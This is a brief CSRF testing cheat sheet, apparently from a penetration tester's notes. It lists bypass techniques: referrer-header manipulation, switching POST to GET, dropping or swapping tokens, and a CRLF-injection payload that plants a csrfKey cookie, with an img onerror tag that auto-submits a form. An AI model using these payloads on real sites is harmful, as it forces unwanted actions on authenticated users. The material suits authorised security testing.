# Cross-site request forgery (CSRF)
> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP
## Test first:
Referrer: https://example.com
if:
"Invalid referrer header" so:
```js
Referrer-Policy: unsafe-url
```
"Invalid referrer validation" so:
```html
<meta name="referrer" content="no-referrer">
```
else:
csrf without csrf protection - EZ
csrf validation depends on request method  - Change post to get
csrf delete csrf parameter
csrf - drop request and test the token in other session 
csrf + crlf - /?search=test%0d%0aSet-Cookie:%20csrfKey=your-key
<img src="https://domain/?search=test%0d%0aSet-Cookie:%20csrfKey=your-key" onerror="document.forms[0].submit()">
